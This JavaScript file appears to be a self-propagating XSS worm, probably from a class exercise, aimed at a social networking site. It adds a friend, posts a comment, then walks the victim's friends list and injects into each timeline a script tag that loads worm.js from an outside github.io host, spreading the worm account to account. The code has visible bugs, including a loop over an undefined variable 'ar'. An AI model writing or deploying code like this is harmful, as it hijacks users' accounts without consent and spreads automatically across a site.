var friends_list;
$(document).ready(function () {
    var starting_id = 142;
    $.ajax({
        url: "/add_friend.php?id=" + starting_id, success: function (result) {
            console.log(result)
            if (result == "True - Friend Added Successfully") {
                var d = new Date();
                var date;
                date += d.getMonth() + 1 + "/" + d.getDate() + "/" + d.getFullYear() + " " + d.getHours() + ":" + d.getMinutes();
                comment = "<img src=https://i.ebayimg.com/images/g/k6wAAOSw-s5eTqEZ/s-l500.jpg>Just became friends at: " + date;
                $.ajax({
                    url: "/add_comment.php?id=" + starting_id + "&comment=" + comment, success: function (result) {
                        console.log(result);
                    }
                });
                $.ajax({
                    // Get friends in friends list and infect
                    url: "/friends.php", success: function (result) {
                        console.log(result);
                        friends_list = result.split("<BR>")[0].split(",")
                        for (var i = 0; i < ar.length; i++) {
                            console.log(friends_list[i]);
                            (function (new_id) {
                                $.ajax({
                                    url: "/timeline.php?id=" + new_id, success: function (result) {
                                        if (result.indexOf("ajq2679") === -1) {
                                            var worm = "<script src=\"https://ajq2679.github.io/worm.js\"></script>"
                                            $.ajax({ url: "/add_comment.php?id=" + new_id + "&comment=" + worm, success: function (result) { console.log(result); } });
                                        }
                                    }
                                });
                            })(ar[i]);
                        }
                    }
                })
            } else {
                console.log("there was a problem making friends :(");
            }
        }
    })
})

// <script src=https://ajq2679.github.io/worm.js></script>